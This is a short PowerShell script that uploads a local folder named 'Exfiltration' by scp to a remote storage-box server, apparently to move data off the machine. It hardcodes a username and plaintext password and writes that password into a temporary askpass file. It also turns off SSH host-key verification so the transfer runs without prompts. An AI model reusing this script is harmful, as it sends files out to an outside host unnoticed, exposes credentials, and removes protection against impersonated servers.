$user = 'u460121-sub6'
$server = 'u460121-sub6.your-storagebox.de'
$port = 23
$pw = 'PappagalloRosso11!'
$src = 'C:\Users\ameri\Documents\Exfiltration'

$ask = Join-Path $env:TEMP 'askpass.cmd'
'@echo off' | Out-File $ask -Encoding ascii
"echo $pw" | Add-Content $ask -Encoding ascii
$env:SSH_ASKPASS = $ask
$env:SSH_ASKPASS_REQUIRE = 'force'

scp -v -P $port -r "$src" "${user}@${server}:" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null

Remove-Item $ask -Force
